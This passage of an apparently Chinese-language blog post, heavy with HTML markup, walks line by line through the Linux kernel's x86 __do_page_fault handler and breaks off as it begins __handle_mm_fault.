class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> noinline <span class="keyword">void</span></span><br><span class="line">__do_page_fault(struct pt_regs *regs, <span class="keyword">unsigned</span> <span class="keyword">long</span> error_code,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> address)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tsk</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span></span><br><span class="line"><span class="keyword">int</span> fault, major = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> flags = FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_KILLABLE;</span><br><span class="line"></span><br><span class="line">tsk = current;</span><br><span class="line">mm = tsk-&gt;mm;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Detect and handle instructions that would cause a page fault for</span></span><br><span class="line"><span class="comment"> * both a tracked kernel page and a userspace page.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (kmemcheck_active(regs))</span><br><span class="line">kmemcheck_hide(regs);</span><br><span class="line">prefetchw(&amp;mm-&gt;mmap_sem);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(kmmio_fault(regs, address)))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We fault-in kernel-space virtual memory on-demand. The</span></span><br><span class="line"><span class="comment"> * &#x27;reference&#x27; page table is init_mm.pgd.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * NOTE! We MUST NOT take any locks for this case. We may</span></span><br><span class="line"><span class="comment"> * be in an interrupt or a critical region, and should</span></span><br><span class="line"><span class="comment"> * only copy the information from the master page table,</span></span><br><span class="line"><span class="comment"> * nothing more.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This verifies that the fault happens in kernel space</span></span><br><span class="line"><span class="comment"> * (error_code &amp; 4) == 0, and that the fault was not a</span></span><br><span class="line"><span class="comment"> * protection error (error_code &amp; 9) == 0.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(fault_in_kernel_space(address))) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(error_code &amp; (PF_RSVD | PF_USER | PF_PROT))) &#123;</span><br><span class="line"><span class="keyword">if</span> (vmalloc_fault(address) &gt;= <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (kmemcheck_fault(regs, address, error_code))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Can handle a stale RO-&gt;RW TLB: */</span></span><br><span class="line"><span class="keyword">if</span> (spurious_fault(error_code, address))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* kprobes don&#x27;t want to hook the spurious faults: */</span></span><br><span class="line"><span class="keyword">if</span> (kprobes_fault(regs))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Don&#x27;t take the mm semaphore here. If we fixup a prefetch</span></span><br><span class="line"><span class="comment"> * fault we could otherwise deadlock:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* kprobes don&#x27;t want to hook the spurious faults: */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(kprobes_fault(regs)))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(error_code &amp; PF_RSVD))</span><br><span class="line">pgtable_bad(regs, error_code, address);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(smap_violation(error_code, regs))) &#123;</span><br><span class="line">bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we&#x27;re in an interrupt, have no user context or are running</span></span><br><span class="line"><span class="comment"> * in a region with pagefaults disabled then we must not take the fault</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(faulthandler_disabled() || !mm)) &#123;</span><br><span class="line">bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * It&#x27;s safe to allow irq&#x27;s after cr2 has been saved and the</span></span><br><span class="line"><span class="comment"> * vmalloc fault has been handled.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * User-mode registers count as a user access even for any</span></span><br><span class="line"><span class="comment"> * potential system fault or CPU buglet:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (user_mode(regs)) &#123;</span><br><span class="line">local_irq_enable();</span><br><span class="line">error_code |= PF_USER;</span><br><span class="line">flags |= FAULT_FLAG_USER;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (regs-&gt;flags &amp; X86_EFLAGS_IF)</span><br><span class="line">local_irq_enable();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS, <span class="number">1</span>, regs, address);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (error_code &amp; PF_WRITE)</span><br><span class="line">flags |= FAULT_FLAG_WRITE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When running in the kernel we expect faults to occur only to</span></span><br><span class="line"><span class="comment"> * addresses in user space.  All other faults represent errors in</span></span><br><span class="line"><span class="comment"> * the kernel and should generate an OOPS.  Unfortunately, in the</span></span><br><span class="line"><span class="comment"> * case of an erroneous fault occurring in a code path which already</span></span><br><span class="line"><span class="comment"> * holds mmap_sem we will deadlock attempting to validate the fault</span></span><br><span class="line"><span class="comment"> * against the address space.  Luckily the kernel only validly</span></span><br><span class="line"><span class="comment"> * references user space from well defined areas of code, which are</span></span><br><span class="line"><span class="comment"> * listed in the exceptions table.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * As the vast majority of faults will be valid we will only perform</span></span><br><span class="line"><span class="comment"> * the source reference check when there is a possibility of a</span></span><br><span class="line"><span class="comment"> * deadlock. Attempt to lock the address space, if we cannot we then</span></span><br><span class="line"><span class="comment"> * validate the source. If this is invalid we can skip the address</span></span><br><span class="line"><span class="comment"> * space check, thus avoiding the deadlock:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(!down_read_trylock(&amp;mm-&gt;mmap_sem))) &#123;</span><br><span class="line"><span class="keyword">if</span> ((error_code &amp; PF_USER) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">    !search_exception_tables(regs-&gt;ip)) &#123;</span><br><span class="line">bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">retry:</span><br><span class="line">down_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The above down_read_trylock() might have succeeded in</span></span><br><span class="line"><span class="comment"> * which case we&#x27;ll have missed the might_sleep() from</span></span><br><span class="line"><span class="comment"> * down_read():</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">might_sleep();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vma = find_vma(mm, address);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!vma)) &#123;</span><br><span class="line">bad_area(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (likely(vma-&gt;vm_start &lt;= address))</span><br><span class="line"><span class="keyword">goto</span> good_area;</span><br><span class="line"><span class="keyword">if</span> (unlikely(!(vma-&gt;vm_flags &amp; VM_GROWSDOWN))) &#123;</span><br><span class="line">bad_area(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (error_code &amp; PF_USER) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Accessing the stack below %sp is always a bug.</span></span><br><span class="line"><span class="comment"> * The large cushion allows instructions like enter</span></span><br><span class="line"><span class="comment"> * and pusha to work. (&quot;enter $65535, $31&quot; pushes</span></span><br><span class="line"><span class="comment"> * 32 pointers and then decrements %sp by 65535.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(address + <span class="number">65536</span> + <span class="number">32</span> * <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>) &lt; regs-&gt;sp)) &#123;</span><br><span class="line">bad_area(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (unlikely(expand_stack(vma, address))) &#123;</span><br><span class="line">bad_area(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Ok, we have a good vm_area for this memory access, so</span></span><br><span class="line"><span class="comment"> * we can handle it..</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">good_area:</span><br><span class="line"><span class="keyword">if</span> (unlikely(access_error(error_code, vma))) &#123;</span><br><span class="line">bad_area_access_error(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If for any reason at all we couldn&#x27;t handle the fault,</span></span><br><span class="line"><span class="comment"> * make sure we exit gracefully rather than endlessly redo</span></span><br><span class="line"><span class="comment"> * the fault.  Since we never set FAULT_FLAG_RETRY_NOWAIT, if</span></span><br><span class="line"><span class="comment"> * we get VM_FAULT_RETRY back, the mmap_sem has been unlocked.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">fault = handle_mm_fault(mm, vma, address, flags);</span><br><span class="line">major |= fault &amp; VM_FAULT_MAJOR;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we need to retry the mmap_sem has already been released,</span></span><br><span class="line"><span class="comment"> * and if there is a fatal signal pending there is no guarantee</span></span><br><span class="line"><span class="comment"> * that we made any progress. Handle this case first.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(fault &amp; VM_FAULT_RETRY)) &#123;</span><br><span class="line"><span class="comment">/* Retry at most once */</span></span><br><span class="line"><span class="keyword">if</span> (flags &amp; FAULT_FLAG_ALLOW_RETRY) &#123;</span><br><span class="line">flags &amp;= ~FAULT_FLAG_ALLOW_RETRY;</span><br><span class="line">flags |= FAULT_FLAG_TRIED;</span><br><span class="line"><span class="keyword">if</span> (!fatal_signal_pending(tsk))</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* User mode? Just return to handle the fatal exception */</span></span><br><span class="line"><span class="keyword">if</span> (flags &amp; FAULT_FLAG_USER)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Not returning to user mode? Handle exceptions or die: */</span></span><br><span class="line">no_context(regs, error_code, address, SIGBUS, BUS_ADRERR);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">up_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line"><span class="keyword">if</span> (unlikely(fault &amp; VM_FAULT_ERROR)) &#123;</span><br><span class="line">mm_fault_error(regs, error_code, address, fault);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Major/minor page fault accounting. If any of the events</span></span><br><span class="line"><span class="comment"> * returned VM_FAULT_MAJOR, we account it as a major fault.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (major) &#123;</span><br><span class="line">tsk-&gt;maj_flt++;</span><br><span class="line">perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MAJ, <span class="number">1</span>, regs, address);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">tsk-&gt;min_flt++;</span><br><span class="line">perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MIN, <span class="number">1</span>, regs, address);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">check_v8086_mode(regs, address, tsk);</span><br><span class="line">&#125;</span><br><span class="line">NOKPROBE_SYMBOL(__do_page_fault);</span><br></pre></td></tr></table></figure><p>首先需要知道的是<code>vma</code>表示的是线性区描述符，<code>tsk</code>表示的是很熟悉的<code>task_struct</code>,<code>mm</code>也是前面文章中提到过的<code>mm_struct</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> flags = FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_KILLABLE;</span><br></pre></td></tr></table></figure><p>首先通过这样一条语句初始化flags，随后初始化上述的变量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(fault_in_kernel_space(address))) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!(error_code &amp; (PF_RSVD | PF_USER | PF_PROT)))&#123;</span><br></pre></td></tr></table></figure><p>通过这条语句以及验证<code>error_code</code>判断缺页异常是否发生在内核空间，而<code>PF_RSVD | PF_USER | PF_PROT</code>的含义分别表示<code>页表项保留 ｜ 用户页异常 ｜ 页保护异常</code>。如果判断结果认定为内核地址空间发生的缺页则使用<code>vmalloc_fault(address)</code>进行处理。</p><p>随后还是主要分析用户态的缺页异常。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(error_code &amp; PF_RSVD))</span><br><span class="line">pgtable_bad(regs, error_code, address);</span><br></pre></td></tr></table></figure><p>如果使用了页表项保留的标识位则代表是页表错误并进行处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(smap_violation(error_code, regs))) &#123;</span><br><span class="line">  bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一步则是验证是否出发了<code>smap</code>保护，如果是则直接杀死进程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(faulthandler_disabled() || !mm)) &#123;</span><br><span class="line">  bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里验证了时候开启了缺页不处理或者是不存在用户空间。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (user_mode(regs)) &#123;</span><br><span class="line">  local_irq_enable();</span><br><span class="line">  error_code |= PF_USER;</span><br><span class="line">  flags |= FAULT_FLAG_USER;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (regs-&gt;flags &amp; X86_EFLAGS_IF)</span><br><span class="line">    local_irq_enable();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断寄存器发生缺页时是否为用户态寄存器，紧接着发送终端请求，然后设置<code>error_code</code>和<code>flags</code>为用户空间发生的缺页。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (error_code &amp; PF_WRITE)</span><br><span class="line">  flags |= FAULT_FLAG_WRITE;</span><br></pre></td></tr></table></figure><p>判断是否是在写的时候发生的，如果是的话则给flags添加相应的标识位。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(!down_read_trylock(&amp;mm-&gt;mmap_sem))) &#123;</span><br><span class="line"><span class="keyword">if</span> ((error_code &amp; PF_USER) == <span class="number">0</span> &amp;&amp; </span><br><span class="line">    !search_exception_tables(regs-&gt;ip)) &#123;</span><br><span class="line">bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">retry:</span><br><span class="line">down_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">might_sleep();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随后对<code>mm_struct</code>上锁，如果上锁失败并且发现是内核空间的异常则杀死进程，成功则继续。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">vma = find_vma(mm, address);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!vma)) &#123;</span><br><span class="line">  bad_area(regs, error_code, address);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (likely(vma-&gt;vm_start &lt;= address))</span><br><span class="line">  <span class="keyword">goto</span> good_area;</span><br><span class="line"><span class="keyword">if</span> (unlikely(!(vma-&gt;vm_flags &amp; VM_GROWSDOWN))) &#123;</span><br><span class="line">  bad_area(regs, error_code, address);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (error_code &amp; PF_USER) &#123;</span><br><span class="line">  <span class="keyword">if</span> (unlikely(address + <span class="number">65536</span> + <span class="number">32</span> * <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>) &lt; regs-&gt;sp)) &#123;</span><br><span class="line">    bad_area(regs, error_code, address);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (unlikely(expand_stack(vma, address))) &#123;</span><br><span class="line">  bad_area(regs, error_code, address);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里则是搜线搜索到地址对应的vma，如果vma不存在则杀死进程。如果使用的线性地址大于<code>vma-&gt;vm_start</code>则进入<code>good_area</code>。如果不是则进入下一个if，判断当前的vma是否为堆栈区，如果不是则直接杀死进程。紧接着验证是否为用户空间的缺页，如果是则紧接着是对栈的一个判断。后续则是增长线性区，如果失败也杀死进程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">good_area:</span><br><span class="line"><span class="keyword">if</span> (unlikely(access_error(error_code, vma))) &#123;</span><br><span class="line">bad_area_access_error(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">fault = handle_mm_fault(mm, vma, address, flags);</span><br><span class="line">major |= fault &amp; VM_FAULT_MAJOR;</span><br></pre></td></tr></table></figure><p>运行到这里先是判断一下<code>error_code</code>与vma是否冲突，如果不冲突则进入分配物理页的核心函数<code>handle_mm_fault</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(fault &amp; VM_FAULT_RETRY)) &#123;</span><br><span class="line">  <span class="keyword">if</span> (flags &amp; FAULT_FLAG_ALLOW_RETRY) &#123;</span><br><span class="line">    flags &amp;= ~FAULT_FLAG_ALLOW_RETRY;</span><br><span class="line">    flags |= FAULT_FLAG_TRIED;</span><br><span class="line">    <span class="keyword">if</span> (!fatal_signal_pending(tsk))</span><br><span class="line">      <span class="keyword">goto</span> retry;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (flags &amp; FAULT_FLAG_USER)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  no_context(regs, error_code, address, SIGBUS, BUS_ADRERR);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里判断是否需要充实，如果需要重试，那么进一步判断在开始初始化的flags中是否包含标志位<code>FAULT_FLAG_ALLOW_RETRY</code>，如果有的话则进行充实，并且擦出掉flags中的允许充实标识为，并且添加<code>FAULT_FLAG_TRIED</code>标志位。</p><h4 id="handle-mm-fault"><a href="#handle-mm-fault" class="headerlink" title="handle_mm_fault"></a><strong>handle_mm_fault</strong></h4><p>这个函数的中的真正处理函数其实是<code>__handle_mm_fault</code>，所以直接看其中的这个函数吧。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span 